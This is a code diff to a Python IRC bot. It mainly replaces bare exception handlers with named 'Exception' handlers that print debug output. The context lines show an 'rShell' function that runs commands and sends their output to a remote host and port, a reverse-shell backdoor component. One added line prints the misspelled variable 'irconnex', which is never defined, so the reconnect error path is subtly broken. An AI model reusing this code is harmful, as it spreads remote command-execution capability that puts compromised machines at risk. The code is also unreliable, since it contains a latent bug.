@@ -95,8 +95,9 @@ def connect():
             ircsock.send(bytes("NICK "+ botnick +"\n", "UTF-8")) # Assign the nick to the bot.
             connected = True
             main()
-        except: # If you can't connect, wait 10 seconds and try again.
+        except Exception as iconnex: # If you can't connect, wait 10 seconds and try again.
             if debugmode: # If debugmode is True, msgs will print to screen.
+                print("Exception: " + str(iconnex))
                 print("Failed to connect to " + str(server) + ":" + str(port) + ". Retrying in 10 seconds...")
             connected = False
             time.sleep(10)
@@ -120,8 +121,9 @@ def reconnect():
             ircsock.send(bytes("NICK "+ botnick +"\n", "UTF-8")) # Assign the nick to the bot.
             connected = True
             main()
-        except: # If you can't connect, wait 10 seconds and try again.
+        except Exception as ireconnex: # If you can't connect, wait 10 seconds and try again.
             if debugmode: # If debugmode is True, msgs will print to screen.
+                print("Exception: " + str(irconnex))
                 print("Failed to reconnect to " + str(server) + ":" + str(port) + ". Retrying in 10 seconds...")
             connected = False
             time.sleep(10)
@@ -219,13 +221,13 @@ def rShell(rsHost, rsPort):
                     output_str = str(stdout_value)
                     currentWD = os.getcwd() + "> "
                     rs.sendto(str.encode(currentWD + output_str), (str(rsHost), int(rsPort)))
-            except rs.error as rserror:
+            except Exception as rsex:
                 if debugmode:
-                    print("rShell Socket Error: " + str(rserror))
+                    print("rShell Exception: " + str(rsex))
                     rs.close()
-    except rs.error as rsconnerr:
+    except Exception as rsconnex:
         if debugmode:
-            print("rShell Socket connection error: " + str(rsconnerr))
+            print("rShell Socket Connection Exception: " + str(rsconnex))
     rs.close()
     
 def runcmd(sc):
